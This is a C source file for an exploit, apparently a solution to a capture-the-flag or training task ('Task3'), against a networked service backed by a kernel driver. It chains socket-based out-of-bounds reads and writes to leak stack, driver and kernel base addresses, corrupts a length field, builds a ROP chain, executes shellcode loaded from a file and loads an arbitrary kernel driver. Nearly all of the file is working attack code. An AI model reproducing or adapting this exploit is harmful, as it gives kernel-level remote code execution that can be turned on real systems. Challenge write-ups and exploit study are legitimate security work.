#include "target.h"
#define STOPCOUNT 50


BOOL Task3Exploit() {

	ULONG countWhile = 0;
	TARGET_INFO info = {0};
	SOCKET reqSocket;
	short newLen = 0x7fff;
	ULONG stack1 = 0,
		stack2 = 0,
		countSocks = 0,
		index = 0,
		leak = 0;

	memset(&info.socks, INVALID_SOCKET, sizeof(info.socks));
	while (1) {

		if ((info.socks.first = ConnectToTarget(TARGETHOST, TARGETPORT)) == INVALID_SOCKET) {
			return FALSE;
		}

		if (!TargetRead(info.socks.first, -1, &stack1)) {
			CloseSock(&info.socks.first);
			return FALSE;
		}

		printf("\rSearch... 0x%08X ", stack1);
		while (1) {
			if (countSocks >= MAXSOCKETVALUE) {
				CloseMBSockets(&info.socks);
				countSocks = 0;
			}

			if ((reqSocket = ConnectToTarget(TARGETHOST, TARGETPORT)) == INVALID_SOCKET) {
				return FALSE;
			}

			info.socks.tmp[countSocks] = reqSocket;
			countSocks++;

			if (!TargetRead(reqSocket, -1, &stack2)) {
				CloseAllSockets(&info.socks);
				return FALSE;
			}

			info.stacks.between = stack1 > stack2
				? stack1 - stack2
				: stack2 - stack1;

			if (((info.stacks.between / 4) + 0x498) > MAXSHORT) {
				//printf("Bad between: 0x%08X\n", stacks.between);
				if (++countWhile >= STOPCOUNT) {
					countWhile = 0;
					CloseAllSockets(&info.socks);
					break;
				}
				continue;
			}
			
			break;
		}
		if (!countWhile) {
			continue;
		}
		printf("\r                    \r");
		printf("Leak first\t\t0x%08X\n", stack1);
		break;
	}

	printf("Current between\t\t0x%08X\n", info.stacks.between);

	//return TRUE;

	if (stack1 > stack2) {
		info.socks.second = reqSocket;
		info.stacks.first = stack1;
		info.stacks.second = stack2;
	}
	else {
		info.socks.second = info.socks.first;
		info.socks.first = reqSocket;
		info.stacks.first = stack2;
		info.stacks.second = stack1;
	}

	info.stacks.second = info.stacks.second - 0x400 - 4;
	info.stacks.first = info.stacks.first - 0x400 - 4;

	printf("Stack first\t\t0x%08X\nStack second\t\t0x%08X\n", info.stacks.first, info.stacks.second);

	index = ((info.stacks.first - info.stacks.second - 0x400) / 4)* (-1);
	if (!TargetRead(info.socks.first, index, &leak)) {
		CloseAllSockets(&info.socks);
		return FALSE;
	}
	//system("pause");
	//printf("Leak value\t0x%08X\n", leak & 0xFFFF);
	if (!TargetWrite(info.socks.first, index, (LPVOID)&newLen)) {
		CloseAllSockets(&info.socks);
		return FALSE;
	}

	index = GET_INDEX_DOWN(info.stacks.second, 8);
	if (!TargetRead(info.socks.second, index, &leak)) {
		CloseAllSockets(&info.socks);
		return FALSE;
	}
	info.DriverBase = leak - rvaToStrQUIT;
	//printf("New LEN value:0x%08X\n", leak & 0xFFFF);
	// USE MODIFED SECOND SOCKET
	// ...

	printf("ImageBase Driver\t0x%08X\n", info.DriverBase);
	

	// TEST CRASH
	//index = GET_INDEX_UP(info.stacks.second, info.stacks.between - 0x4c);
	//printf("INDEX: %d\n", index);
	//ULONG address = 0x01020103; // ret
	//if (!TargetWrite(info.socks.second, index, (LPVOID)&address)) {
	//	CloseAllSockets(&info.socks);
	//	return FALSE;
	//}
	//Sleep(1000);
	//if (!SendToTarget(info.socks.first, (LPVOID)"\n", 1)) {
	//	return FALSE;
	//}
	// TEST CRASH

	info.leakSock = INVALID_SOCKET;
	Sleep(1000);
	if (InitROP(&info)) {
		// DO NOT CLOSE SOCKET info.socks.first -> IT WILL CRASH SYSTEM
		//printf("Sleeping...");
		//Sleep(10000);
		ULONG pKeWaitForSingleObject = 0,
			versionOSAddr = 0,
			scSize = 0,
			driverSize = 0;
		PBYTE scBytes = 0,
			driverBytes = 0;

		if (MemoryROP(&info,
			READ,
			info.DriverBase + rva_KernelImpAddr, // 0x300C
			(LPVOID)&pKeWaitForSingleObject, 4)) {

			//printf("Addr KeWaitForSingleObject\t0x%08X\n", pKeWaitForSingleObject);

			if (FindImageBaseByAddr(&info, pKeWaitForSingleObject, &info.KernelBase)) {
				printf("ImageBase Kernel\t0x%08X\n", info.KernelBase);
			}

			LoadPeImage(&info.kernel, &info, info.KernelBase);
			LoadPeImage(&info.driver, &info, info.DriverBase);

			versionOSAddr = FindExportByName(&info.kernel.pe, "NtBuildNumber", info.KernelBase);
			
			if (!MemoryROP(&info, READ, versionOSAddr, &info.versionOS, 2)) {
				CloseAllSockets(&info.socks);
				return FALSE;
			}

			printf("Version OS\t\t%d\n", info.versionOS);

			scBytes = (PBYTE)malloc(0x1000);
			driverBytes = (PBYTE)malloc(0x5000);
			if (!scBytes || !driverBytes) {
				printf("Error alloc\n");
				//CloseAllSockets(&info.socks);
				return FALSE;
			}
			ZeroMemory(scBytes, 0x1000);
			ZeroMemory(driverBytes, 0x5000);

			printf("Execute shellcode...\n");
			if (!(scSize = GetFileBytes(scBytes, "sc.bin"))) {
				printf("Error GetFileBytes sc.bin\n");
			}
			else {
				ExecuteCode(&info, scBytes, scSize);
			}
			
			if (!(driverSize = GetFileBytes(driverBytes, "task3_2223.sys"))) {
				printf("Error GetFileBytes task3_2223.sys\n");
			}
			else {
				if (InitFuns(&info)) {
					ULONG address = 0, addressForSave = 0;
					SOCKET sock = INVALID_SOCKET;

					if (WriteDriver(&info, driverBytes,
						driverSize, &address,
						&sock, &addressForSave)) {
						if (CreateFileDriver(&info, address, addressForSave, driverSize)) {
							if (ExecDriver(&info, addressForSave)) {
								CloseSock(&sock);
							}
						}
					}
					
				}
			}
			
			free(scBytes);
			free(driverBytes);

		}

		
	}
	//printf("Sleeping...");
	//Sleep(10000);
	CloseExploit(&info);
	CloseAllSockets(&info.socks);
	return TRUE;
}


int main() {

	if (!Task3Exploit()) {
		printf("\nExploit ret error ~(o_0)~\n");
		return 0;
	}
	printf("\nExploit ret success \\(*.*)/\n");

	return 0;
}